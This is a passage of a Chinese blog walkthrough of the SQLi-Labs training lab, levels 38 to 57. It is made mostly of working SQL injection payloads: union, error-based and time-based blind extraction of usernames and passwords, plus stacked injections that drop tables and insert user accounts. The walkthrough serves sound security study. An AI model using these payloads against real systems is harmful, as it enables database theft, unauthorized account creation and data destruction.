src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240724094321466.png" alt="image-20240724094321466"></p><p>删除test表</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;; drop table test;–-+</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240724094400615.png" alt="image-20240724094400615"></p><p>无啦</p><p>再创建一个新用户试试</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;; insert into users values(18,&#x27;Rannnn&#x27;,&#x27;Rannnn&#x27;);–-+</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240724094600595.png" alt="image-20240724094600595"></p><p>任意sql语句，懂我意思吧</p><p>能干啥我就不说了嗷</p><h3 id="Less-39"><a href="#Less-39" class="headerlink" title="Less-39"></a>Less-39</h3><p>输入id数，页面正常回显，输入单引号后页面报错</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240724100403472.png" alt="image-20240724100403472"></p><p>可知id参数是整数，正常联合注入就行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1 union select 1,2,3</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240724102414964.png" alt="image-20240724102414964"></p><p>当然也可以使用堆叠注入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1;create table test like users;--+</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240724102436500.png" alt="image-20240724102436500"></p><h3 id="Less-40"><a href="#Less-40" class="headerlink" title="Less-40"></a>Less-40</h3><p>此关id参数是单引号加括号闭合，然后使用联合注入就可以了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查看数据表</span><br><span class="line">?id=-1&#x27;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+</span><br><span class="line">查看字段</span><br><span class="line">?id=-1&#x27;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br><span class="line">查看数据</span><br><span class="line">?id=-1&#x27;) union select 1,2,group_concat(username,id,password) from users--+</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240724104034012.png" alt="image-20240724104034012"></p><h3 id="Less-41"><a href="#Less-41" class="headerlink" title="Less-41"></a>Less-41</h3><p>此关和Less-39一样，id是整数。</p><p>也可以使用堆叠注入</p><h3 id="Less-42"><a href="#Less-42" class="headerlink" title="Less-42"></a>Less-42</h3><p>进入此关，发现与Less-24的页面好像一模一样</p><p>经过各种尝试发现这关使用二次注入是行不通的，然后username的位置也是没有SQL注入漏洞的，所以这关尝试在password的位置使用堆叠注入攻击</p><p>在password的位置输入admin’</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240724105105123.png" alt="image-20240724105105123"></p><p>根据报错信息判断闭合方式为’#，并且为字符型注入</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240724105130272.png" alt="image-20240724105130272"></p><p>创建一张表试试</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240724105232106.png" alt="image-20240724105232106"></p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240724105316628.png" alt="image-20240724105316628"></p><p>再试试创建一个新用户</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240724105429808.png" alt="image-20240724105429808"></p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240724105446497.png" alt="image-20240724105446497"></p><p>登录成功</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240724105501027.png" alt="image-20240724105501027"></p><h3 id="Less-43"><a href="#Less-43" class="headerlink" title="Less-43"></a>Less-43</h3><p>此关和Less-42差不多，就是密码参数是单引号和括号闭合的（末尾记得注释<code>--+</code>）。</p><h3 id="Less-44"><a href="#Less-44" class="headerlink" title="Less-44"></a>Less-44</h3><p>在用户名使用万能密码测试，全部都登录失败。在密码字段使用万能密码测试，使用单引号和井号闭合时登录成功。说明用户名参数注入时存在过滤，密码字段存在单引号闭合的字符型注入。</p><p>在密码处输入以下语句可以创建一个test表</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a&#x27;;create table test like users;#</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240724141839587.png" alt="image-20240724141839587"></p><p>和 Less -42 完全一样，每次登陆时完成一步堆叠注入。</p><h3 id="Less-45"><a href="#Less-45" class="headerlink" title="Less-45"></a>Less-45</h3><p>本关和Less-43一样（闭合方式为<code>&#39;)#&#39;</code>）</p><h3 id="Less-46"><a href="#Less-46" class="headerlink" title="Less-46"></a>Less-46</h3><p>可以发现此关开始不是让我们输入id了，而是输入sort查询，输入sort&#x3D;1试试</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240724142541420.png" alt="image-20240724142541420"></p><p>可以发现结果全部出来了</p><p>输入2试试呢？</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240724142605623.png" alt="image-20240724142605623"></p><p>可以发现顺序变了。喂，学了那么久的数据库，应该都猜到SQL语句是什么了吧？</p><p>哎呀，戳啦，是<code>order by</code>！</p><p>不信？看看源码</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240724142835185.png" alt="image-20240724142835185"></p><p>叫！！！</p><p>所以我们现在得知整个SQL语句可控的就是order by之后的语句段</p><p>输入sort&#x3D;4’，因为整个表格内不存在第四列，单引号测试是否为字符型</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240724143116627.png" alt="image-20240724143116627"></p><p>根据错误信息，判断为数字型注入</p><p>页面返回了完整的错误信息，所以可以使用报错注入或者延时注入，这里使用报错注入</p><p>可以在不知道数据库名的情况下直接查看数据表（注意：报错注入一次只能显示一条信息，需要使用limit方法把数据分隔成一条一条显示，比如下面的limit 3,1，就是跳过前三条，返回接下来的一条数据）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sort=1 and updatexml(1,concat(1,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 3,1)),1)</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240724144026481.png" alt="image-20240724144026481"></p><p>也可以使用下面的代码，不需要使用limit方法即可显示所有信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sort=1 and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)--+</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240724144604668.png" alt="image-20240724144604668"></p><p>查看表下所有字段</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sort=1 and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),0x7e),1)--+</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240724144704071.png" alt="image-20240724144704071"></p><p>查看表内所有数据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sort=1 and updatexml(1,concat(1,(select username from users limit 0,1)),1)</span><br><span class="line">?sort=1 and updatexml(1,concat(1,(select password from users limit 0,1)),1)</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240724145038801.png" alt="image-20240724145038801"></p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240724145050020.png" alt="image-20240724145050020"></p><h3 id="Less-47"><a href="#Less-47" class="headerlink" title="Less-47"></a>Less-47</h3><p>输入单引号页面报错，末尾加上注释符<code>--+</code>后正常，为字符型注入</p><p>注入方式与Less-46一样</p><h3 id="Less-48"><a href="#Less-48" class="headerlink" title="Less-48"></a>Less-48</h3><p>与Less-46一样，不过没有了报错显示，只能使用延时注入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sort=1 and if(length(database())=8,1,sleep(2))</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240724145945812.png" alt="image-20240724145945812"></p><p>页面快速反应，证明数据库长度为8</p><p>查看当前数据库第一个字母</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sort=1 and if(substr(database(),1,1)=&#x27;s&#x27;,1,sleep(2))</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240724150135135.png" alt="image-20240724150135135"></p><p>页面快速回显，证明当前库的第一个字母为s，修改substr函数的索引依次往后面猜解，这里就不做演示了（耗时太长，建议使用脚本）</p><p>查看当前库下的第一张表的第一个字母</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sort=1 and if(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),1,1)=&#x27;e&#x27;,1,sleep(2))</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240724150345018.png" alt="image-20240724150345018"></p><p>页面快速反应，证明当前库下的第一张表的第一个字母为e，修改substr函数的索引依次往后面猜解，这里不做演示</p><p>查看users表下的第一个字段下的第一个字母</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sort=1 and if(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),1,1)=&#x27;i&#x27;,1,sleep(2))</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240724150752149.png" alt="image-20240724150752149"></p><p>页面快速反应，证明user表下的第一个字段的第一个字母为i，测试第二个字段和第三个字段的第一个字母</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sort=1 and if(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 1,1),1,1)=&#x27;u&#x27;,1,sleep(2))</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240724150928294.png" alt="image-20240724150928294"></p><p>页面快速反应，证明user表下的第二个字段的第一个字母为u</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sort=1 and if(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 2,1),1,1)=&#x27;p&#x27;,1,sleep(2))</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240724151010865.png" alt="image-20240724151010865"></p><p>页面快速反应，证明user表下的第三个字段的第一个字母为p</p><p>查看username,password字段下的第一个值的第一个字母</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sort=1 and if(substr((select group_concat(username,password) from security.users limit 0,1),1,1)=&#x27;d&#x27;,1,sleep(2))</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240724151144156.png" alt="image-20240724151144156"></p><p>页面快速反应，证明username和password字段下的第一个值的第一个字母为d，更改substr函数的索引依次往后面猜解，这里不具体演示</p><p>延时盲注的特点就是只能一个字母一个字母的去猜，这里也可以发送到burpsuite的intruer模块进行暴力破解，这里就不演示了，理论都是一样的</p><h3 id="Less-49"><a href="#Less-49" class="headerlink" title="Less-49"></a>Less-49</h3><p>输入正常参数，网页回显用户名列表。对 sort 参数使用单引号闭合，网页无回显。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sort=1&#x27;</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240725082138055.png" alt="image-20240725082138055"></p><p>将后面的内容注释掉，网页用户名列表，得出此处存在单引号闭合的字符型的盲注。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sort=1&#x27;--+</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240725082211021.png" alt="image-20240725082211021"></p><p><strong>获取数据库信息</strong></p><p>使用时间盲注，流程和 Less 48 差不多，使用单引号闭合。得出数据库名，再使用同样的方法继续爆破表名、字段名及其剩余信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sort=1 AND IF(LEFT((SELECT database()), 8)=&#x27;security&#x27;,sleep(1),1)--+</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240725085807154.png" alt="image-20240725085807154"></p><h3 id="Less-50"><a href="#Less-50" class="headerlink" title="Less-50"></a>Less-50</h3><p>输入sort&#x3D;1，页面正常回显，在末尾加上一个单引号，页面报错，且没有回显sort数，去掉单引号，在末尾加上恒成立语句，页面正常回显，由此判断此关为数字型注入，这不跟前面Less-46一模一样嘛</p><p>不对，既然一模一样，为啥还有分两关？有问题，绝对有问题，马上看源码！</p><p>一看，你小子果然不对劲哈</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240725102540798.png" alt="image-20240725102540798"></p><p>Less-46使用的函数为mysqL fetch_assoc()，但这里却使用了mysgli_multi_guery()</p><p>You know m3,bro?</p><p>所以这里的不同点就在于本关可以使用堆叠注入的形式</p><p>报错注入攻击和时间盲注的攻击这里就不讲了，具体看Less-46</p><p><strong>堆叠注入</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sort=1;create table test like users;--+</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240725103104344.png" alt="image-20240725103104344"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sort=1;insert into users values(18,&#x27;Rannnn&#x27;,&#x27;Rannnn&#x27;);--+</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240725103213258.png" alt="image-20240725103213258"></p><h3 id="Less-51"><a href="#Less-51" class="headerlink" title="Less-51"></a>Less-51</h3><p>输入sort&#x3D;1，页面显示正常，在末尾加一个单引号，页面报错</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240725140436386.png" alt="image-20240725140436386"></p><p>根据错误信息显示判断闭合方式为<code>’--+</code>，并且为字符型注入</p><p>这里有完整的错误回显，所以可以使用报错注入和时间注入，且查看源码后发现在本关使用了mysgli_multi_guery()函数，所以也是可以使用堆叠注入的</p><p>这里就演示报错注入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sort=1&#x27; and updatexml(1,concat(1,(select user())),1)--+</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240725141021491.png" alt="image-20240725141021491"></p><p>查看数据表</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sort=1&#x27; and updatexml(1,concat(1,(select table_name from information_schema.tables where table_schema=database() limit 3,1)),1)--+</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240725143855590.png" alt="image-20240725143855590"></p><p>查看字段（users记得16进制编码）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sort=1&#x27; and updatexml(1,concat(1,(select column_name from information_schema.columns where table_name=0x7573657273 limit 2,1)),1)--+</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240725144259546.png" alt="image-20240725144259546"></p><p>查看数据内容</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sort=1&#x27; and updatexml(1,concat(1,(select username from users limit 1,1)),1)--+</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240725145007792.png" alt="image-20240725145007792"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sort=1&#x27; and updatexml(1,concat(1,(select password from users limit 1,1)),1)--+</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240725145029513.png" alt="image-20240725145029513"></p><h3 id="Less-52"><a href="#Less-52" class="headerlink" title="Less-52"></a>Less-52</h3><p>输入sort&#x3D;1，页面正常回显，加上单引号，页面不显示错误信息</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240725150004110.png" alt="image-20240725150004110"></p><p>因为无错误回显，我们我们只能去猜闭合方式</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sort=1--+  #回显正常</span><br><span class="line">?sort=1&#x27;--+ #回显错误</span><br></pre></td></tr></table></figure><p>所以判断为数字型注入</p><p>因为没有错误信息回显，所以我们只能使用时间盲注，但是本关使用mysgli_multi_guery()函数，所以也可以使用堆叠注入</p><p>前面的关卡有详细的解决方法，这里我就不做演示</p><h3 id="Less-53"><a href="#Less-53" class="headerlink" title="Less-53"></a>Less-53</h3><p>输入sort&#x3D;1，页面正常回显，加上单引号，页面不显示错误信息</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240725165901095.png" alt="image-20240725165901095"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sort=1&#x27;--+</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240725165923958.png" alt="image-20240725165923958"></p><p>所以判断这里闭合方式为’–+，并且为字符型注入</p><p>因为没有错误信息回显，所以我们只能使用时间盲注，但是本关使用mysgli_multi_guery()函数，所以也可以使用堆叠注入</p><p>前面的关卡有详细的解决方法，这里就不做演示</p><h2 id="第四部分：Challenges"><a href="#第四部分：Challenges" class="headerlink" title="第四部分：Challenges"></a>第四部分：Challenges</h2><h3 id="Less-54"><a href="#Less-54" class="headerlink" title="Less-54"></a>Less-54</h3><p>进入页面，屏幕上回显了一段英文</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240726091022280.png" alt="image-20240726091022280"></p><p>翻译：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">请按照靶场要求的操作，将ID作为参数输入，并输入数值</span><br><span class="line">此挑战的目标是需要在10次操作内将数据库“CHALLENGES”的随机表中转储密钥（KEY）</span><br><span class="line">为了有趣，每次重置时，挑战都会生成随机的表名、列名和表数据。始终保持新鲜</span><br></pre></td></tr></table></figure><p>来者不善啊，这不纯纯CTF嘛，跟现实中的SQL注入很像了</p><p>输入正常ID数，页面正常回显，且用掉了一次机会</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240726091717578.png" alt="image-20240726091717578"></p><p>末尾加上单引号</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240726092405149.png" alt="image-20240726092405149"></p><p>没有错误回显信息，只能猜测闭合方式</p><p>这里只有10次机会，猜解过程就省略了，如果猜解超过了10次，可以点击右上角的重置挑战按钮进行重置即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;--+</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240726092522631.png" alt="image-20240726092522631"></p><p>所以闭合方式为<code>&#39; --+</code>，且为字符型注入</p><p>判断字段数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; order by 3--+ #回显正常</span><br><span class="line">?id=1&#x27; order by 4--+ #回显错误</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240726092704146.png" alt="image-20240726092704146"></p><p>确定回显位</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,3--+</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240726092737384.png" alt="image-20240726092737384"></p><p>查看数据库和数据表</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=database()--+</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240726092845323.png" alt="image-20240726092845323"></p><p>查看m93vdzgg8q表下的所有字段</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,database(),group_concat(column_name) from information_schema.columns where table_name=&#x27;m93vdzgg8q&#x27;--+</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240726092937871.png" alt="image-20240726092937871"></p><p>查看secret_FM51字段下的值</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,database(),group_concat(secret_FM51) from challenges.m93vdzgg8q--+</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240726093057910.png" alt="image-20240726093057910"></p><p>将返回的KEY提交到窗口就可以了</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240726093150271.png" alt="image-20240726093150271"></p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240726093159213.png" alt="image-20240726093159213"></p><h3 id="Less-55"><a href="#Less-55" class="headerlink" title="Less-55"></a>Less-55</h3><p>进入页面，跟上一关的模式一样，但是次数变成了14次</p><p>照常先判断字符型还是数字型，判断过程不演示</p><p>最终判断闭合为<code>) --+</code></p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240726094558475.png" alt="image-20240726094558475"></p><p>其余步骤与上一题一样</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1) order by 4--+</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240726094643655.png" alt="image-20240726094643655"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1) union select 1,2,3--+</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240726094717924.png" alt="image-20240726094717924"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1) union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=database()--+</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240726094802897.png" alt="image-20240726094802897"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1) union select 1,database(),group_concat(column_name) from information_schema.columns where table_name=&#x27;639rxu396q&#x27;--+</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240726094845613.png" alt="image-20240726094845613"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1) union select 1,database(),group_concat(secret_1CJG) from challenges.639rxu396q--+</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240726094932390.png" alt="image-20240726094932390"></p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240726094945753.png" alt="image-20240726094945753"></p><h3 id="Less-56"><a href="#Less-56" class="headerlink" title="Less-56"></a>Less-56</h3><p>进入此关，与上一题一模一样</p><p>判断字符型还是数字型，过程不演示</p><p>最终判断为<code>&#39;) --+&#39;</code></p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240726095248591.png" alt="image-20240726095248591"></p><p>其余过程与上一题一模一样</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;) order by 4--+</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240726095332733.png" alt="image-20240726095332733"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,2,3--+</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240726095355717.png" alt="image-20240726095355717"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=database()--+</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240726100041018.png" alt="image-20240726100041018"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,database(),group_concat(column_name) from information_schema.columns where table_name=&#x27;w4yp326rdr&#x27; --+</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240726100109552.png" alt="image-20240726100109552"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,database(),group_concat(secret_YC1O) from w4yp326rdr --+</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240726100152777.png" alt="image-20240726100152777"></p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240726100201043.png" alt="image-20240726100201043"></p><h3 id="Less-57"><a href="#Less-57" class="headerlink" title="Less-57"></a>Less-57</h3><p>页面不出所料还是一样的，判断字符型还是数字型</p><p>最后判断为<code>&quot; --+</code></p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240726100411123.png" alt="image-20240726100411123"></p><p>其余部分一模一样，这里就不演示了，放一张最后拿到KEY的图</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot; union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=database()--+</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&quot; union select 1,database(),group_concat(column_name) from information_schema.columns where table_name=&#x27;gt4eny50qo&#x27; --+</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&quot; union select 1,database(),group_concat(secret_5BOJ) from gt4eny50qo --+</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240726100600588.png" alt="image-20240726100600588"></p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240726100704727.png" alt="image-20240726100704727"></p><h3 id="Less-58"><a href="#Less-58" class="headerlink" 